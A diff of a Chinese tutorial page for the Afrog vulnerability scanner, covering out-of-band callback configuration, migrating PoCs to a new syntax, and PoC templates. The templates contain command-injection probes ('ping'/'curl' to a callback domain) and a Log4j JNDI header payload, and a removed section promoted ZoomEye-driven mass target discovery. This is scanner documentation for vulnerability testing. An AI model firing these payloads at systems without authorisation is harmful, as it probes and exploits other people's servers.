@@ -22,8 +22,30 @@ Afrog 的配置文件名为 `afrog-config.yaml`。
 很多高危漏洞（如 Log4j2、Fastjson、Blind SSRF、Blind SQLi）触发后，服务器**不会返回任何错误信息**，而是默默执行命令。
 这时候，我们需要让服务器去访问我们控制的一台机器（反连平台）。如果我们的机器收到了请求，就证明漏洞存在。
 
-### 配置方法
-Afrog 支持多种反连平台，最常用的是 **Ceye.io** 和 **Dnslog.cn**。
+### 先说“最新版 OOB”到底升级了什么？
+如果你用过旧版 OOB，你可能见过一种“经典套路”：**触发 -> 等几秒 -> 去平台查一下有没有命中**。
+它能用，但也有两个痛点：
+- 证据不够清晰：只能说“命中/没命中”，很难解释“命中发生在何时、出现了几次、是不是重复记录”。
+- 平台返回不稳定：有的返回窗口有限、有的会重复、有的只给 subdomain，不给完整 URL，导致你用 token/路径去验证时很难做得很严谨。
+
+最新版 OOB 做了一次“底层升级”，但 **PoC 写法完全不需要变复杂**：
+- **PoC 仍然只写 `{{oob.DNS}}/{{oob.HTTP}} + oobCheck(...) + oobEvidence()`**
+- 但 Afrog 内部把 OOB 从“一坨 body 文本 contains”升级成了“记录条目 -> 去重 -> 事件缓存 -> 证据摘要”
+
+你可以把它理解为：**扫描器自带一个轻量的“事件仓库（EventStore）”**：
+- 同一个 filter 的命中会被缓存、去重、保留一段时间
+- `oobEvidence()` 不再是“随便截一段平台 body”，而是更像“可复核的证据摘要 + 最近几条命中记录”
+
+### 这一升级带来哪些优点？
+用人话讲就是四个字：**更稳、更快**。
+- **更稳**：平台重复返回、窗口滚动、记录格式差异时，误判/漏判风险更低
+- **更快**：同一个 OOB filter 命中过一次，后续 `oobCheck()` 更容易做到“秒回”
+- **证据更友好**：`oobEvidence()` 给出 `protocol/count/last_at` 以及“最近 N 条命中摘要”，复核更舒服
+- **对老 PoC 更友好**：老用户只需要把旧函数/旧占位符迁到新写法即可（下面给你迁移清单）
+
+### 配置方法（先把反连平台装上）
+Afrog 支持多种反连平台，新手最常用的是 **Ceye.io**（稳定）和 **Dnslog.cn**（免费快捷）。
+配置完成后，OOB PoC 才能真正工作：否则 `oobCheck(...)` 会一直返回 false（因为根本没有可用的反连平台）。
 
 #### 1. 配置 Ceye.io (推荐稳定)
 去 [ceye.io](http://ceye.io) 注册个账号，拿到 `Identifier` (Domain) 和 `API Key`。
@@ -45,8 +67,27 @@ reverse:
     domain: "dnslog.cn"
 ```
 
-#### 3. 自建平台 (进阶)
-如果你是红队大佬，可以使用 [Revsuit](https://github.com/revsuit/revsuit) 或 [Xray](https://docs.xray.cool/#/config/reverse) 的反连端。
+#### 3. Alphalog / Xray / Revsuit (进阶玩家)
+如果你已经有团队平台/自建平台，可以按对应字段配置（字段名以最新版配置结构为准）：
+
+**Alphalog：**
+```yaml
+reverse:
+  alphalog:
+    domain: "你的反连域名"
+    api_url: "http(s)://你的alphalog-api"
+```
+
+**Xray：**
+```yaml
+reverse:
+  xray:
+    x_token: "你的xray token"
+    domain: "你的反连域名"
+    api_url: "http://x.x.x.x:8777"
+```
+
+**Revsuit：**
 ```yaml
 reverse:
   revsuit:
@@ -55,6 +96,111 @@ reverse:
     http_url: "http://yourdomain.com"
     api_url: "http://yourdomain.com/revsuit/api"
 ```
+
+### 新版 OOB PoC 怎么写？（最推荐写法）
+先记住两条铁律：
+- PoC 里默认就有 `oob` 变量，不用再 `set: oob: oob()` 初始化
+- 新版只推荐用 `oobCheck(...)` 做命中判断，用 `oobEvidence()` 做证据输出
+
+你会用到的三个东西：
+- `{{oob.DNS}}`：外带 DNS 域名（通常用于 `ping {{oob.DNS}}`、`nslookup {{oob.DNS}}`、JNDI 的弱验证等）
+- `{{oob.HTTP}}`：外带 HTTP URL（通常用于 `curl {{oob.HTTP}}`、SSRF/命令执行外带等）
+- `oobCheck(protocol, timeout)`：等待命中（`protocol` 推荐 `"dns"` 或 `"http"`，timeout 是秒；推荐：dns=5、http=3）
+
+### 新版与旧版 PoC 的编写区别（老用户迁移指南）
+下面这份表，你照着改就行：
+
+1）**旧函数：`oobCheck(oob, protocol, timeout)` → 新函数：`oobCheck(protocol, timeout)`**
+- 旧写法（示例）：
+  - `expression: oobCheck(oob, oob.ProtocolDNS, 5)`
+- 新写法（示例）：
+  - `expression: oobCheck(oob.ProtocolDNS, 5)`
+  - 或 `expression: oobCheck("dns", 5)`
+
+2）**旧占位符：`{{oobDNS}}/{{oobHTTP}}` → 新占位符：`{{oob.DNS}}/{{oob.HTTP}}`**
+
+3）**旧的 set 自映射可以删掉**
+- 你可能见过这种历史包袱：
+  - `set: oobDNS: oob.DNS`
+  - `set: oobHTTP: oob.HTTP`
+- 新版不需要，直接用 `{{oob.DNS}}/{{oob.HTTP}}` 即可
+
+4）**一键迁移（推荐）**
+如果你手里有很多旧 PoC，不想手工改，可以用 `-pocmigrate` 自动迁移旧语法到新版写法。
+```bash
+# 迁移单个 PoC 文件
+afrog -pocmigrate /path/to/poc.yaml
+
+# 迁移一个目录下的所有 PoC
+afrog -pocmigrate /path/to/pocs/
+```
+小提醒：迁移只是“语法转换”，迁移完建议你用真实目标/靶场跑一遍，确认 PoC 扫描可用。
+
+### 最推荐的新版 OOB PoC 模板（直接抄）
+
+#### 模板 1：DNS 外带（弱验证，适合“只要命中就行”的场景）
+```yaml
+id: demo-oob-dns
+
+info:
+  name: Demo OOB DNS
+  author: your-name
+  severity: info
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /?dns=ping%20{{oob.DNS}}
+    expression: oobCheck("dns", 5)
+
+expression: r0()
+```
+
+#### 模板 2：HTTP 外带（中验证，适合 SSRF/命令执行 curl/wget）
+```yaml
+id: demo-oob-http
+
+info:
+  name: Demo OOB HTTP
+  author: your-name
+  severity: info
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /?http=curl%20{{oob.HTTP}}
+    expression: oobCheck("http", 3)
+
+expression: r0()
+```
+
+#### 模板 3：JNDI（DNS 观测，Log4j 类常用）
+```yaml
+id: demo-oob-jndi
+
+info:
+  name: Demo OOB JNDI (DNS Observe)
+  author: your-name
+  severity: info
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /
+      headers:
+        User-Agent: "${jndi:ldap://{{oob.DNS}}/a}"
+    expression: oobCheck("dns", 5)
+
+expression: r0()
+```
+
+#### 模板 4：证据输出（推荐给高危 PoC）
+你不需要手动写 output，Afrog 会在命中时自动把 `oob_evidence` 作为证据挂到结果里。
+终端输出、`report.html` 报告和 AfrogWeb 报告都会显示这段 OOB 证明内容，方便你复核与留证。
+
 
 ---
 
@@ -123,32 +269,11 @@ afrog -t http://example.com -s spring -wecom
 
 ---
 
-## 🌐 自动寻敌：空间测绘联动
-
-Afrog 支持联动 **ZoomEye** 自动寻找目标。
-你需要去 ZoomEye 申请 API Key。
-
-```yaml
-cyberspace:
-  zoom_eyes:
-    - "你的ZoomEye_API_KEY"
-```
-
-使用方法：
-```bash
-# 搜索 100 个使用了 tomcat 的目标并自动扫描
-afrog -cs zoomeye -q "app:tomcat" -qc 100
-```
-这简直是刷洞神器！
-
----
-
 ## 📝 总结一下
 
 配置文件 `afrog-config.yaml` 是 Afrog 的灵魂。
-1.  **OOB 配置**：让你能检测 Log4j2 等无回显漏洞（必配！）。
-2.  **Webhook**：让你实现无人值守扫描。
-3.  **Cyberspace**：让你拥有源源不断的扫描目标。
+1.  **OOB 配置**：让你能检测 Log4j2 等无回显漏洞（建议优先配好！）。
+2.  **Webhook**：让你实现无人值守扫描（扫到洞自动推送）。
 
 把这些配置好，你的 Afrog 就从“步枪”进化成了“自动制导导弹”。
 
